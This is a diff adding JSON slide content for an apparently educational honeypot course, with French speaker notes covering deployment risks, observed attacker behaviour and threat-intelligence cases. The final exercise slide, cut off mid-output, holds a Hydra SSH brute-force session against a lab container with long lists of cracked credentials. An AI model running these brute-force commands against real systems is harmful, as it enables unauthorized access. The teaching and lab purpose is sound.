+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Exercise: Home Network Deployment",
+            "notes": [
+                "Le r\u00e9seau local peut \u00eatre compromis si le honeypot peut le contacter.",
+                "Les conteneurs et les VM peuvent \u00eatre compromis mais l'h\u00f4te pourrait l'\u00eatre aussi avec un docker escape suivi d'un VM escape.",
+                "L'attaquant peut utiliser l'honeypot pour mener des attaques sur internet.",
+                "L'attaquant peut utiliser les ressources de l'ordinateur gr\u00e2ce au honeypot."
+            ],
+            "aside": "References: <a href=\"https://github.security.telekom.com/2015/03/honeypot-tpot-concept.html\">Introduction into T-Pot: A Multi-Honeypot Platform</a>.",
+            "image": "box_honeypot_soluce.svg",
+            "image alt": "Network diagram illustrating risky inbound traffic flows to a honeypot behind a router using port forwarding.",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "A home deployment should isolate the honeypot from personal devices, restrict outbound traffic, and ensure the compromise of the honeypot cannot impact the local network."
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "content",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Exercise: Enterprise Deployment",
+            "notes": [
+                "Quels sont les risques de d\u00e9ployer un honeypot dans un r\u00e9seau d\u00e9di\u00e9 en entreprise ?"
+            ],
+            "aside": "References: <a href=\"https://onlinelibrary.wiley.com/doi/10.1155/2020/8865474\">A Smart Agent Design for Cyber Security Based on Honeypot and Machine Learning</a>.",
+            "image": "enterprise_honeypot.svg",
+            "image alt": "Enterprise network infrastructure diagram showing a honeypot deployed in a dedicated network alongside production systems",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "Identify the security risks of deploying a honeypot within a production enterprise infrastructure."
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "content-left",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Exercise: Enterprise Deployment",
+            "notes": [
+                "Un honeypot qui est joint au domaine permet d'identifier les comptes compromis mais cela n\u00e9cessite une liaison directe avec l'AD machine critique de l'entreprise, c'est donc tr\u00e8s fortement d\u00e9conseill\u00e9.",
+                "Si le honeypot est sur la m\u00eame infrastructure que la production, le m\u00eame hyperviseur, l'attaquant pourrait compromettre le honeypot, faire une VM escape et compromettre l'ensemble des serveurs sur cet hyperviseur, donc la production."
+            ],
+            "aside": "References: <a href=\"https://onlinelibrary.wiley.com/doi/10.1155/2020/8865474\">A Smart Agent Design for Cyber Security Based on Honeypot and Machine Learning</a>.",
+            "image": "enterprise_honeypot_soluce.svg",
+            "image alt": "Enterprise network diagram illustrating risky inbound traffic flows to a dedicated honeypot for threat detection and monitoring.",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "A production honeypot should never be joined to the corporate domain or deployed on a production hypervisor, and should always remain isolated from critical systems."
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "content",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Exercise: Cloud Deployment",
+            "notes": [
+                "Quels sont les risques si vous d\u00e9ployez un honeypot dans le cloud ?"
+            ],
+            "aside": "References: <a href=\"https://www.microsoft.com/en-us/research/publication/long-term-study-of-honeypots-in-a-public-cloud/\">Long-Term Study of Honeypots in a Public Cloud</a>.",
+            "image": "cloud_honeypot.svg",
+            "image alt": "Cloud infrastructure diagram showing a honeypot deployed in a dedicated virtual network alongside production cloud workloads",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "Identify the security risks of deploying a honeypot in a public cloud environment."
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "content-left",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Exercise: Cloud Deployment",
+            "notes": [
+                "Le premier probl\u00e8me avec le cloud c'est la consommation de ressources, en effet si l'attaquant consomme beaucoup de ressources vous risquez de payer tr\u00e8s cher votre honeypot.",
+                "Le second probl\u00e8me est le contrat que vous avez avec votre fournisseur, en effet vous \u00eates responsable de vos syst\u00e8mes et si votre syst\u00e8me perturbe les autres clients du cloud le fournisseur peut se retourner contre vous et bloquer votre compte.",
+                "Si des pr\u00e9judices arrivent \u00e0 d'autres clients et qu'il est prouv\u00e9 que vous n'avez pris aucune mesure pour \u00e9viter cela vous pouvez \u00eatre jug\u00e9 responsable et devoir payer de lourdes sanctions.",
+                "En pratique, les fournisseurs cloud se doivent de s\u00e9curiser correctement les liens entre les diff\u00e9rents clients en les isolant correctement, donc vous risquez principalement le blocage de votre compte et une bonne facture pour votre honeypot."
+            ],
+            "aside": "References: <a href=\"https://www.microsoft.com/en-us/research/publication/long-term-study-of-honeypots-in-a-public-cloud/\">Long-Term Study of Honeypots in a Public Cloud</a>.",
+            "image": "cloud_honeypot_soluce.svg",
+            "image alt": "Cloud network diagram illustrating risky inbound traffic flows to a dedicated honeypot for cloud threat detection and cybersecurity monitoring",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "A cloud honeypot should be deployed in an isolated network with controlled outbound communications and without access to production cloud resources."
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "content",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Balancing Honeypot Security and Realism",
+            "notes": [
+                "La s\u00e9curit\u00e9 des honeypots est importante mais certaines configurations de s\u00e9curit\u00e9 peuvent vous faire perdre des tentatives d'attaque soit par la contrainte de devoir mener une attaque plus compliqu\u00e9e soit par les attaquants du honeypot \u00e0 cause de comportements diff\u00e9rents.",
+                "La bonne pratique est de supprimer toutes interactions, r\u00e9seau, infrastructure ou syst\u00e8me, entre le honeypot et la production. Cela co\u00fbte plus cher car d\u00e9ployer un container est un co\u00fbt beaucoup plus faible que d'utiliser un serveur bare metal pour le honeypot."
+            ],
+            "aside": "References: <a href=\"https://www.usenix.org/conference/woot18/presentation/vetterl\">Bitter Harvest: Systematically Fingerprinting Low and Medium-interaction Honeypots at Internet Scale</a>.",
+            "image": "realism_vs_safety.jpg",
+            "image alt": "Split image comparing a person standing on a real rooftop ledge with the same scene recreated safely on a movie studio set, illustrating realism versus controlled simulation",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "Security recommendations reduce the risk of operating a honeypot, but they often decrease its realism and the attacker's freedom of action."
+                },
+                {
+                    "type": "ul",
+                    "content": [
+                        "<strong>Isolate the honeypot</strong> to prevent access to production systems.",
+                        "<strong>Restrict outbound connections</strong> to avoid malware propagation or the loss of valuable IOCs.",
+                        "<strong>Monitor logs continuously</strong> to detect unexpected activity and investigate attacks.",
+                        "<strong>Keep the environment up to date</strong> to reduce the risk of unintended compromise.",
+                        "Use a dedicated infrastructure and <strong>never connect a honeypot directly to critical systems</strong>."
+                    ]
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "title",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Real-World Honeypot Results, Threat Intelligence, and Lessons Learned",
+            "notes": [
+                "Dans cette partie, on va voir des cas concrets avec des r\u00e9sultats."
+            ]
+        },
+        {
+            "type": "content",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "What Do Medium-Interaction Honeypots Capture in Practice ?",
+            "notes": [
+                "Les honeypots de faible et moyenne interaction vont principalement fournir des donn\u00e9es d\u00e9j\u00e0 connues.",
+                "Ils sont tr\u00e8s utilis\u00e9s dans les domaines de recherche pour faire des statistiques sur les attaques et observer les tendances."
+            ],
+            "aside": "References: <a href=\"https://www.sciencedirect.com/science/article/abs/pii/S0167404820300699\">Expert System Assessing Threat Level of Attacks on a Hybrid SSH Honeynet</a>.",
+            "image": "honeypots_statistics.png",
+            "image alt": "Medium-interaction honeypot statistics by cloud provider showing the distribution of attacks and malicious activity across cloud platforms",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "Medium-interaction honeypots primarily collect <strong>well-known automated attacks</strong> rather than previously unseen threats."
+                },
+                {
+                    "type": "p",
+                    "content": "Typical observations include SSH brute-force attacks (especially against the root account), Nmap and Masscan scans, Mirai, Gafgyt, and XMRig malware, IoT attacks, SMB probing, and the exploitation of recently disclosed vulnerabilities."
+                },
+                {
+                    "type": "p",
+                    "content": "A typical Internet-exposed SSH honeypot can record more than <strong>20,000 connection attempts from around 900 IP addresses across 45 countries in just 24 hours</strong>, while collecting hundreds of malware samples."
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "content-left",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "What Human Attackers Really Do on High-Interaction Honeypots",
+            "notes": [
+                "On obtient des informations plus int\u00e9ressantes avec un honeypot de haute interaction.",
+                "On peut voir que les attaques utilisent souvent les m\u00eames dossiers de t\u00e9l\u00e9chargement, ce qui permet de d\u00e9finir des r\u00e8gles de surveillance et de hardening sur ces dossiers dans le but de prot\u00e9ger les syst\u00e8mes.",
+                "On peut voir que beaucoup d'attaquants ne poursuivent pas leurs attaques si le t\u00e9l\u00e9chargement avec wget ne fonctionne pas, on peut donc monitorer wget pour identifier des attaques ou le supprimer pour \u00e9viter ces m\u00eames attaques.",
+                "Une attaque plus int\u00e9ressante a r\u00e9v\u00e9l\u00e9 une tentative de lat\u00e9ralisation, \u00e9tape particuli\u00e8rement int\u00e9ressante et strat\u00e9gique des cyberattaques pour les d\u00e9fenseurs."
+            ],
+            "aside": "References: <a href=\"https://arxiv.org/pdf/0704.0858\">Lessons Learned from the Deployment of a High-Interaction Honeypot</a>.",
+            "image": "honeypot_protection.jpg",
+            "image alt": "Illustration of a cybersecurity honeypot where attackers test different attack methods while defenders reinforce the protection based on observed attack techniques",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "Unlike medium-interaction honeypots, high-interaction honeypots can <strong>reveal real attacker behavior</strong> after the initial compromise."
+                },
+                {
+                    "type": "p",
+                    "content": "Common observations include changing passwords, downloading tools (mostly with <strong>wget</strong>, often abandoning the attempt if it fails), storing files in <strong>/tmp, /var/tmp, or /dev/shm</strong>, performing internal network reconnaissance, escalating privileges with rootkits, sending phishing emails, and cleaning traces of the intrusion (~30% of observed cases)."
+                },
+                {
+                    "type": "p",
+                    "content": "Although the environment allowed lateral movement, only <strong>one attempt</strong> was observed during six months of monitoring. This likely reflects attacker objectives, early detection of the honeypot, or environmental constraints rather than the absence of lateral movement in real-world intrusions."
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "content",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "How Honeypots Support Cyber Threat Intelligence and Campaign Tracking",
+            "notes": [
+                "Certaines entreprises de cybers\u00e9curit\u00e9 ont besoin de conna\u00eetre les menaces tr\u00e8s actives avant les intrusions, pour cela elles utilisent des honeypots particuli\u00e8rement discrets.",
+                "Par exemple: une nouvelle variante d'un botnet TeamTNT a \u00e9t\u00e9 analys\u00e9e gr\u00e2ce \u00e0 un honeypot.",
+                "Dans certains cas on peut d\u00e9couvrir de nouveaux exploits de CVE et dans des cas encore plus rares identifier des personnes derri\u00e8re les campagnes ou le d\u00e9veloppement de malwares."
+            ],
+            "aside": "References: <a href=\"https://unit42.paloaltonetworks.com/docker-honeypot/\">Unit 42 \u2013 Docker Honeypot Reveals New TeamTNT Activity</a>, <a href=\"https://blog.talosintelligence.com/cisco-talos-honeypot-analysis-reveals/\">Cisco Talos \u2013 Honeypot Analysis Reveals Chinese Threat Actor Activity</a>.",
+            "image": "code_propagation_teamtnt.png",
+            "image alt": "Screenshot of TeamTNT malware propagation code captured by a cybersecurity honeypot for threat analysis",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "While many honeypots capture known automated attacks, strategically deployed honeypots can help security researchers document new campaigns, malware variants, and attacker infrastructure."
+                },
+                {
+                    "type": "p",
+                    "content": "Examples include the discovery of a new <strong>TeamTNT botnet variant</strong> targeting Docker environments and the analysis of attackers exploiting known vulnerabilities such as <strong>Drupal (CVE-2018-7600), Oracle WebLogic (CVE-2017-10271), and Spring Data Commons (CVE-2018-1273)</strong>."
+                },
+                {
+                    "type": "p",
+                    "content": "In some cases, small artifacts left by attackers can support attribution efforts. A specific string (qq952135763) found during analysis was linked to online accounts, repositories, and personal websites, helping researchers identify a potential Chinese-speaking threat actor."
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "content-left",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Benefits and Value of Well-Designed Honeypots and Honeytokens",
+            "notes": [
+                "Les pi\u00e8ges comme les honeytokens ont un avantage, ils sont difficilement identifiables s'ils sont tr\u00e8s customis\u00e9s et sont tr\u00e8s peu couteux, c'est un outil de d\u00e9tection que je recommanderais aux d\u00e9fenseurs et qui sont souvent sous-utilis\u00e9s ou non prioris\u00e9s.",
+                "Les honeypots sont plus couteux, ils permettent d'\u00eatre proactif sur la menace et d'observer des cas concrets mais pour se faire il faut g\u00e9rer un bon honeypot, discret et puissant sans compromettre votre SI et il faut analyser r\u00e9guli\u00e8rement les r\u00e9sultats."
+            ],
+            "aside": "References: <a href=\"https://www.enisa.europa.eu/publications/proactive-detection-of-security-incidents-II-honeypots\">Proactive Detection of Security Incidents II: Honeypots</a>.",
+            "image": "custom_vs_know_honeypots.jpg",
+            "image alt": "Split illustration showing an attacker fleeing from an obvious trap before willingly entering a hidden carnivorous plant, symbolizing visible versus concealed honeypots",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "The value of honeypots and honeytokens strongly depends on their quality, placement, and operational management.<br><strong>Honeytokens:</strong>"
+                },
+                {
+                    "type": "ul",
+                    "content": [
+                        "Highly effective detection mechanism with a low false-positive rate.",
+                        "Low deployment cost and minimal operational overhead."
+                    ]
+                },
+                {
+                    "type": "p",
+                    "content": "<strong>Honeypots:</strong>"
+                },
+                {
+                    "type": "ul",
+                    "content": [
+                        "Provide low-cost visibility into attacker activity and commonly used tools and techniques.",
+                        "High-quality honeypots can generate valuable intelligence by capturing advanced attacker behaviors and campaigns.",
+                        "However, they require time, infrastructure, and the right exposure to attract relevant threats."
+                    ]
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "content",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Limitations of Honeypots",
+            "notes": [
+                "La plus grosse limite d'un honeypot c'est que vous n'\u00eates jamais sur qu'il va \u00eatre attaqu\u00e9.",
+                "Il faut bien identifier le co\u00fbt en temps humain de l'analyse.",
+                "Il y a un risque li\u00e9 \u00e0 introduire un honeypot puisque l'attaquant pourra le compromettre et l'utiliser."
+            ],
+            "aside": "References: <a href=\"https://www.sciencedirect.com/topics/computer-science/honeypots\">Honeypots \u2013 Computer and Information Security Handbook</a>.",
+            "image": "ignoring_honeypots.jpg",
+            "image alt": "Photo of a hacker choosing bread, butter, and jam while ignoring multiple honey pots, symbolizing that a honeypot may never be targeted by an attacker",
+            "texts": [
+                {
+                    "type": "ul",
+                    "content": [
+                        "<strong>Depend on attacker interaction</strong>: No value if attackers do not discover or engage with the honeypot.",
+                        "<strong>Risk of detection</strong>: Skilled attackers may identify honeypots through behavioral or environmental fingerprints.",
+                        "<strong>Potential security risk</strong>: A compromised honeypot can be abused as a pivot point or attack infrastructure."
+                    ]
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "title",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Hands-On Honeypot Exercises: Attack, Detection, and Evasion",
+            "notes": [
+                "Maintenant que vous connaissez la th\u00e9orie, on peut faire quelques exercices."
+            ]
+        },
+        {
+            "type": "content",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Exercise 1: Attack the Honeypot and Analyze the Results",
+            "notes": [
+                "Vous pouvez attaquer mon honeypot et nous verrons ensemble l'analyse des attaques."
+            ],
+            "aside": "References: <a href=\"https://arxiv.org/abs/1608.06249\">A Survey on Honeypot Software and Data Analysis</a>.",
+            "image": "analyze_recon.jpg",
+            "image alt": "Cybersecurity honeypot showing evidence of a reconnaissance attack with attacker activity detected and analyzed",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "Launch attacks against the honeypot and analyze attacker activity in real time."
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "content-left",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Exercise 2: Identify the Honeypot",
+            "notes": [
+                "Vous \u00eates sur un honeypot et vous le savez, mais mettez-vous \u00e0 la place d'un attaquant comment identifier que vous \u00eates sur un honeypot ?"
+            ],
+            "aside": "References: <a href=\"https://vbn.aau.dk/en/publications/gotta-catch-em-all-a-multistage-framework-for-honeypot-fingerprin/\">Gotta catch'em all: A Multistage Framework for Honeypot Fingerprinting</a>.",
+            "image": "recon.jpg",
+            "image alt": "SSH session captured by a honeypot showing an attacker performing reconnaissance commands on a targeted system",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "Analyze the environment and determine whether the target is a real system or a deception environment."
+                }
+            ],
+            "code": "\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ hydra -s 2222 -l user -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 172.17.0.3 ssh             \nHydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-02 09:53:47\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 1021 login tries (l:1/p:1021), ~64 tries per task\n[DATA] attacking ssh://172.17.0.3:2222/\n[2222][ssh] host: 172.17.0.3   login: user   password: 123456\n[2222][ssh] host: 172.17.0.3   login: user   password: 12345\n[2222][ssh] host: 172.17.0.3   login: user   password: admin\n[2222][ssh] host: 172.17.0.3   login: user   password: 123456789\n[2222][ssh] host: 172.17.0.3   login: user   password: password\n[2222][ssh] host: 172.17.0.3   login: user   password: nicole\n[2222][ssh] host: 172.17.0.3   login: user   password: monkey\n[2222][ssh] host: 172.17.0.3   login: user   password: daniel\n[2222][ssh] host: 172.17.0.3   login: user   password: jessica\n[2222][ssh] host: 172.17.0.3   login: user   password: iloveyou\n[2222][ssh] host: 172.17.0.3   login: user   password: princess\n[2222][ssh] host: 172.17.0.3   login: user   password: 1234567\n[2222][ssh] host: 172.17.0.3   login: user   password: 12345678\n[2222][ssh] host: 172.17.0.3   login: user   password: abc123\n[2222][ssh] host: 172.17.0.3   login: user   password: babygirl\n[2222][ssh] host: 172.17.0.3   login: user   password: lovely\n1 of 1 target successfully completed, 16 valid passwords found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-02 09:53:58\n                                                                                                                                                                                                                                            \n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ hydra -s 2222 -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -p monkey 172.17.0.3 ssh \nHydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-02 09:55:18\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 175 login tries (l:175/p:1), ~11 tries per task\n[DATA] attacking ssh://172.17.0.3:2222/\n[2222][ssh] host: 172.17.0.3   login: admin   password: monkey\n[2222][ssh] host: 172.17.0.3   login: 4Dgifts   password: monkey\n[2222][ssh] host: 172.17.0.3   login: abrt   password: monkey\n[2222][ssh] host: 172.17.0.3   login: adm   password: monkey\n[2222][ssh] host: 172.17.0.3   login: administrator   password: monkey\n[2222][ssh] host: 172.17.0.3   login: avahi-autoipd   password: monkey\n[2222][ssh] host: 172.17.0.3   login: backup   password: monkey\n[2222][ssh] host: 172.17.0.3   login: anon   password: monkey\n[2222][ssh] host: 172.17.0.3   login: arpwatch   password: monkey\n[2222][ssh] host: 172.17.0.3   login: beef-xss   password: monkey\n[2222][ssh] host: 172.17.0.3   password: monkey\n[2222][ssh] host: 172.17.0.3   login: _apt   password: monkey\n[2222][ssh] host: 172.17.0.3   login: auditor   password: monkey\n[2222][ssh] host: 172.17.0.3   login: avahi   password: monkey\n[2222][ssh] host: 172.17.0.3   login: bbs   password: monkey\n[2222][ssh] host: 172.17.0.3   login: bin   password: monkey\n[2222][ssh] host: 172.17.0.3   login: bitnami   password: monkey\n[2222][ssh] host: 172.17.0.3   login: checkfsys   password: monkey\n[2222][ssh] host: 172.17.0.3   login: checksys   password: monkey\n[2222][ssh] host: 172.17.0.3   login: checkfs   password: monkey\n[2222][ssh] host: 172.17.0.3   login: chronos   password: monkey\n[2222][ssh] host: 172.17.0.3   login: chrony   password: monkey\n[2222][ssh] host: 172.17.0.3   login: cmwlogin   password: monkey\n[2222][ssh] host: 172.17.0.3   login: cockpit-ws   password: monkey\n[2222][ssh] host: 172.17.0.3   login: colord   password: monkey\n[2222][ssh] host: 172.17.0.3   login: couchdb   password: monkey\n[2222][ssh] host: 172.17.0.3   login: dbadmin   password: monkey\n[2222][ssh] host: 172.17.0.3   login: dbus   password: monkey\n[2222][ssh] host: 172.17.0.3   login: Debian-exim   password: monkey\n[2222][ssh] host: 172.17.0.3   login: cups-pk-helper   password: monkey\n[2222][ssh] host: 172.17.0.3   login: daemon   password: monkey\n[2222][ssh] host: 172.17.0.3   login: debian   password: monkey\n[2222][ssh] host: 172.17.0.3   login: Debian-snmp   password: monkey\n[2222][ssh] host: 172.17.0.3   login: demo   password: monkey\n[2222][ssh] host: 172.17.0.3   login: demos   password: monkey\n[2222][ssh] host: 172.17.0.3   login: diag   password: monkey\n[2222][ssh] host: 172.17.0.3   login: distccd   password: monkey\n[2222][ssh] host: 172.17.0.3   login: dni   password: monkey\n[2222][ssh] host: 172.17.0.3   login: dnsmasq   password: monkey\n[2222][ssh] host: 172.17.0.3   login: dradis   password: monkey\n[2222][ssh] host: 172.17.0.3   login: EZsetup   password: monkey\n[2222][ssh] host: 172.17.0.3   login: fal   password: monkey\n[2222][ssh] host: 172.17.0.3   login: games   password: monkey\n[2222][ssh] host: 172.17.0.3   login: gdm   password: monkey\n[2222][ssh] host: 172.17.0.3   login: geoclue   password: monkey\n[2222][ssh] host: 172.17.0.3   login: fax   password: monkey\n[2222][ssh] host: 172.17.0.3   login: ftp   password: monkey\n[2222][ssh] host: 172.17.0.3   login: gnats   password: monkey\n[2222][ssh] host: 172.17.0.3   login: gopher   password: monkey\n[2222][ssh] host: 172.17.0.3   login: gropher   password: monkey\n[2222][ssh] host: 172.17.0.3   login: gnome-initial-setup   password: monkey\n[2222][ssh] host: 172.17.0.3   login: haldaemon   password: monkey\n[2222][ssh] host: 172.17.0.3   login: halt   password: monkey\n[2222][ssh] host: 172.17.0.3   login: hplip   password: monkey\n[2222][ssh] host: 172.17.0.3   login: guest   password: monkey\n[2222][ssh] host: 172.17.0.3   login: inetsim   password: monkey\n[2222][ssh] host: 172.17.0.3   login: irc   password: monkey\n[2222][ssh] host: 172.17.0.3   login: informix   password: monkey\n[2222][ssh] host: 172.17.0.3   login: king-phisher   password: monkey\n[2222][ssh] host: 172.17.0.3   login: install   password: monkey\n[2222][ssh] host: 172.17.0.3   login: iodine   password: monkey\n[2222][ssh] host: 172.17.0.3   login: lightdm   password: monkey\n[2222][ssh] host: 172.17.0.3   login: listen   password: monkey\n[2222][ssh] host: 172.17.0.3   login: landscape   password: monkey\n[2222][ssh] host: 172.17.0.3   login: libstoragemgmt   password: monkey\n[2222][ssh] host: 172.17.0.3   login: libuuid   password: monkey\n[2222][ssh] host: 172.17.0.3   login: jet   password: monkey\n[2222][ssh] host: 172.17.0.3   login: karaf   password: monkey\n[2222][ssh] host: 172.17.0.3   login: kernoops   password: monkey\n[2222][ssh] host: 172.17.0.3   login: linaro   password: monkey\n[2222][ssh] host: 172.17.0.3   login: list   password: monkey\n[2222][ssh] host: 172.17.0.3   login: lp   password: monkey\n[2222][ssh] host: 172.17.0.3   login: mail   password: monkey\n[2222][ssh] host: 172.17.0.3   login: lpadm   password: monkey\n[2222][ssh] host: 172.17.0.3   login: lpadmin   password: monkey\n[2222][ssh] host: 172.17.0.3   login: lxd   password: monkey\n[2222][ssh] host: 172.17.0.3   login: lynx   password: monkey\n[2222][ssh] host: 172.17.0.3   login: man   password: monkey\n[2222][ssh] host: 172.17.0.3   login: noaccess   password: monkey\n[2222][ssh] host: 172.17.0.3   login: me   password: monkey\n[2222][ssh] host: 172.17.0.3   login: mysql   password: monkey\n[2222][ssh] host: 172.17.0.3   login: messagebus   password: monkey\n[2222][ssh] host: 172.17.0.3   login: miredo   password: monkey\n[2222][ssh] host: 172.17.0.3   login: mountfs   password: monkey\n[2222][ssh] host: 172.17.0.3   login: nobody   password: monkey\n[2222][ssh] host: 172.17.0.3   login: mountfsys   password: monkey\n[2222][ssh] host: 172.17.0.3   login: mountsys   password: monkey\n[2222][ssh] host: 172.17.0.3   login: news   password: monkey\n[2222][ssh] host: 172.17.0.3   login: nobody4   password: monkey\n[2222][ssh] host: 172.17.0.3   login: ntp   password: monkey\n[2222][ssh] host: 172.17.0.3   login: omi   password: monkey\n[2222][ssh] host: 172.17.0.3   login: nuucp   password: monkey\n[2222][ssh] host: 172.17.0.3   login: nxautomation   password: monkey\n[2222][ssh] host: 172.17.0.3   login: nxpgsql   password: monkey\n[2222][ssh] host: 172.17.0.3   login: operator   password: monkey\n[2222][ssh] host: 172.17.0.3   login: oracle   password: monkey\n[2222][ssh] host: 172.17.0.3   login: omsagent   password: monkey\n[2222][ssh] host: 172.17.0.3   login: pico   password: monkey\n[2222][ssh] host: 172.17.0.3   login: OutOfBox   password: monkey\n[2222][ssh] host: 172.17.0.3   login: pi   password: monkey\n[2222][ssh] host: 172.17.0.3   login: polkitd   password: monkey\n[2222][ssh] host: 172.17.0.3   login: pollinate   password: monkey\n[2222][ssh] host: 172.17.0.3   login: popr   password: monkey\n[2222][ssh] host: 172.17.0.3   login: postfix   password: monkey\n[2222][ssh] host: 172.17.0.3   login: postgres   password: monkey\n[2222][ssh] host: 172.17.0.3   login: postmaster   password: monkey\n[2222][ssh] host: 172.17.0.3   login: pulse   password: monkey\n[2222][ssh] host: 172.17.0.3   login: printer   password: monkey\n[2222][ssh] host: 172.17.0.3   login: proxy   password: monkey\n[2222][ssh] host: 172.17.0.3   login: radxa   password: monkey\n[2222][ssh] host: 172.17.0.3   login: riscv   password: monkey\n[2222][ssh] host: 172.17.0.3   login: redsocks   password: monkey\n[2222][ssh] host: 172.17.0.3   login: rje   password: monkey\n[2222][ssh] host: 172.17.0.3   login: rfindd   password: monkey\n[2222][ssh] host: 172.17.0.3   login: rpc   password: monkey\n[2222][ssh] host: 172.17.0.3   login: rtkit   password: monkey\n[2222][ssh] host: 172.17.0.3   login: rock   password: monkey\n[2222][ssh] host: 172.17.0.3   login: ROOT   password: monkey\n[2222][ssh] host: 172.17.0.3   login: rpcuser   password: monkey\n[2222][ssh] host: 172.17.0.3   login: rwhod   password: monkey\n[2222][ssh] host: 172.17.0.3   login: root   password: monkey\n[2222][ssh] host: 172.17.0.3   login: service   password: monkey\n[2222][ssh] host: 172.17.0.3   login: rooty   password: monkey\n[2222][ssh] host: 172.17.0.3   login: setroubleshoot   password: monkey\n[2222][ssh] host: 172.17.0.3   login: setup   password: monkey\n[2222][ssh] host: 172.17.0.3   login: saned   password: monkey\n[2222][ssh] host: 172.17.0.3   login: sgiweb   password: monkey\n[2222][ssh] host: 172.17.0.3   login: shutdown   password: monkey\n[2222][ssh] host: 172.17.0.3   login: sigver   password: monkey\n[2222][ssh] host: 172.17.0.3   login: speech-dispatcher   password: monkey\n[2222][ssh] host: 172.17.0.3   login: sshd   password: 